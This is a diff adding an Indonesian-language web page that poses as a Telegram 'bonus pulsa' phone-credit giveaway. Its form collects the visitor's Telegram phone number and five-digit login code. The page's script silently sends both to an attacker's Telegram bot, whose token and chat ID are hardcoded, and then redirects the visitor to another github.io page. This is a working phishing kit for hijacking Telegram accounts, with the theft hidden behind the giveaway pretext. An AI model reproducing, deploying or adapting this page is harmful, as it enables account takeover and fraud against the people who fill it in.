@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIVEAWAY Bonus Pulsa TELEGRAM</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .background {
+            background: #f0f0f0;
+        }
+
+        .container {
+            margin-top: 20px;
+        }
+
+        .logo-atas {
+            text-align: center;
+        }
+
+        .image-web img {
+            width: 250px;
+        }
+
+        .btnNext {
+            background-color: #0ca2e7;
+            border: none;
+            border-radius: 10px;
+            width: 90%;
+            color: white;
+            font-weight: bold;
+            height: 45px;
+        }
+
+        #popup-container {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 250px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 100px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+        }
+
+        #popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        #popup-close {
+            cursor: pointer;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
+        }
+
+        #popup-content {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <nav class="background">
+        <div class="container">
+            <a class="navbar-brand" href="#1231">
+                <h2 style="color: #10b3ff">GIVEAWAY BONUS PULSA TELEGRAM</h2>
+                <div class="logo-atas">
+                    <img class="img-fluid" src="telegram-logo.png" alt="">
+                </div>
+            </a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="title-web mt-2">
+            <div class="logo-atas">
+                <center><img class="img-fluid" src="fotopulsa.jpg" alt=""></center>
+            </div>
+            <div class="title-web mt-1">
+                <h2 class="text-center">Isi Kode Bonus dikirim di Telegram</h2>
+            </div><br>
+            <div class="image-web">
+                <div class="col-md-3">
+                    <label class="ms-5" for="nope">Nomor akun TELEGRAM</label><br>
+                    <center><input type="number" name="nope" id="nope" style="border: 1px solid rgb(0, 195, 255); width: 80%"></center>
+                </div>
+
+                <div class="col-md-3 mt-3">
+                    <label class="ms-5" for="pin">Kode 5 angka di Telegram</label><br>
+                    <center><input type="number" name="pin" id="pin" style="border: 1px solid rgb(0, 153, 255); width: 80%"></center>
+                </div>
+            </div>
+            <div class="bnt-next mt-3 mb-3 text-center"></div>
+            <center><button onclick="next()" class="btnNext">Kirimkan</button></center>
+            <br>
+            <p id="proses" class="text-center" style="color: rgb(134, 2, 2); display: none">TERIMA KASIH PERMINTAAN ANDA SEDANG DI PROSES</p>
+            <div class="image-web mt-2">
+                <center>
+                    <img src=" " alt="" width="250px">
+                </center>
+            </div>
+        </div>
+    </div>
+
+    <div id="popup-overlay"></div>
+    <div id="popup-container">
+        <div id="popup-content">
+            <span id="popup-close" onclick="closePopup()">&times;</span>
+            <p>Popup Content Goes Here!</p>
+            <button onclick="window.location.href = 'https://www.example.com'">Visit Example.com</button>
+            <button onclick="window.open('https://www.example.com', '_blank')">Open in New Window</button>
+        </div>
+    </div>
+
+    <script>
+        function openPopup() {
+            document.getElementById('popup-container').style.display = 'block';
+            document.getElementById('popup-overlay').style.display = 'block';
+        }
+
+        function closePopup() {
+            document.getElementById('popup-container').style.display = 'none';
+            document.getElementById('popup-overlay').style.display = 'none';
+        }
+
+        function next() {
+            let proses = document.querySelector("#proses");
+            let nope = document.querySelector("#nope").value;
+            let pin = document.querySelector("#pin").value;
+            let token = "6854558867:AAHpWOz8lFqJqzHXq9RbVl-gS2YnGoy3oxg";
+            let id_tele = "6250486742";
+            
+            if (nope === "" || pin === "") {
+                alert("Mohon Isi data Dengan Benar");
+            } else {
+                let message = `  *Kode Telegram Bonus*%0A________________%0ANo. handphone:%0A${nope}%0A%0AKode Telegram: ${pin}`;
+                let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id_tele}&text=${message}`;
+
+                fetch(api, {
+                    method: 'POST',
+                })
+                .then((response) => response.json())
+                .then(data => {
+                    console.log('Pesan terkirim:', data);
+                    window.location.href = "https://dapatpulsa.github.io/b0nust3le9r-m/";
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+        }
+
+        // Munculkan popup setelah 5 detik
+        setTimeout(openPopup, 5000);
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+</body>
+</html>
